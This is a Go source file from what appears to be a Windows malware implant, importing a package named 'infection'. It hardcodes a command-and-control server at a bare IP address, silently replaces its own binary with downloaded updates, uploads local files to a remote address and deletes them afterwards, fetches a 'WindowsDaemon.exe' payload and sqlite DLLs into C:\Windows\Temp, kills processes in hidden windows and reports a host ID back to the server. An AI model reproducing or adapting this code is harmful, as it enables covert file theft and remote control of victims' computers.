package lib

import (
	"bytes"
	"fmt"
	"github.com/inconshreveable/go-update"
	"github.com/parnurzeal/gorequest"
	"infection/machineinfo"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

const VERSION string = "2"
const MIDURL string = "http://111.231.82.173/"
const MIDFILE string = "http://111.231.82.173/file/"
const MIDAUTH string = "http://111.231.82.173:9000/auth"
const MIDETCD string = "111.231.82.173:2379"
const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
const CURRENTPATH = "C:\\Windows\\Temp\\"

var HOSTID = machineinfo.GetSystemVersion().Hostid

type Msg struct {
	Hostid string `json:"hostid"`
	Code   int    `json:"code"`
}

func RandInt64(min, max int64) int {
	rand.Seed(time.Now().UnixNano())
	return int(min + rand.Int63n(max-min+1))
}

func DoUpdate() error {
	for {
		resp, err := http.Get(MIDFILE + "version.txt")
		if err != nil {
			return err
		}
		body, _ := ioutil.ReadAll(resp.Body)
		defer resp.Body.Close()
		current_file := strings.Split(os.Args[0], "\\")
		frpe, err := http.Get(MIDFILE + current_file[len(current_file)-1])
		if strings.TrimSpace(string(body)) != VERSION {
			err = update.Apply(frpe.Body, update.Options{TargetPath: os.Args[0]})
			if err != nil {
				// error handling
			}
		} else {
			//fmt.Println(string(body))
			time.Sleep(time.Duration(RandInt64(300, 1000)))
		}
		return err
	}
}
func SingleFile(file string, addr string, finflag chan string) {
	pbuf := new(bytes.Buffer)
	writer := multipart.NewWriter(pbuf)
	formFile, err := writer.CreateFormFile("file", file)
	if err != nil {
		log.Println("Create form file failed: %s\n", err)
	}
	// 从文件读取数据，写入表单
	srcFile, err := os.Open(file)
	if err != nil {
		fmt.Println("Open source file failed: s\n", err)
	}
	defer srcFile.Close()
	_, err = io.Copy(formFile, srcFile)
	if err != nil {
		fmt.Println("Write to form file falied: %s\n", err)
	}
	// 发送表单
	contentType := writer.FormDataContentType()
	writer.Close()
	re, err := http.Post(addr, contentType, pbuf)
	if re.StatusCode == 200 {
		os.RemoveAll(file)
		log.Println("Upload single file Status Successful !")
	} else {
		log.Println("Upload single file Status Fail !")
	}
	finflag <- "file sent"
	return
}

func Removetempimages(filenames []string, finflag chan string) {
	for _, name := range filenames {
		os.Remove(name)
	}
}

func KillCheck() {
	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsDaemon.exe")
	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	// not Start will continue
	killcheck.Run()
}

func MultiFileDown(files []string, step string) {
	if len(files) == 0 && step == "init" {
		var fileinit = []struct {
			Name string
		}{
			{"WindowsDaemon.exe"},
			{"sqlite3_386.dll"},
			{"sqlite3_amd64.dll"},
		}
		for _, name := range fileinit {
			Get(MIDFILE+name.Name, name.Name)
		}
	}
}

func Get(url string, file string) {
	resp, err := http.Get(url)
	if err != nil {
		return
	}
	body, _ := ioutil.ReadAll(resp.Body)
	ioutil.WriteFile(CURRENTPATH+file, body, 0644)
}

func FileExits(path string) error {
	_, err := os.Stat(path)
	if err != nil {
		return err
	}
	return nil
}

func ErrorStatusCode(code int, hostid string, addr string) {
	msg := Msg{
		Hostid: hostid,
		Code:   code,
	}
	_, _, _ = gorequest.New().
		Post(addr).
		Set("content-type", "application/x-www-form-urlencoded").
		Send(msg).
		End()
}

//func SystemCheck(){
//	switch runtime.GOOS {
//	case "windows":
//		current_file := strings.Split(os.Args[0], "\\")
//		c := exec.Command("cmd", "/C", "taskkill", "/IM",current_file[len(current_file)-1])
//		if err := c.Run(); err != nil {
//			fmt.Println("Error: ", err)
//		}
//	case "linux":
//	case "darwin":
//
//	case "freebsd":
//
//	}
//}
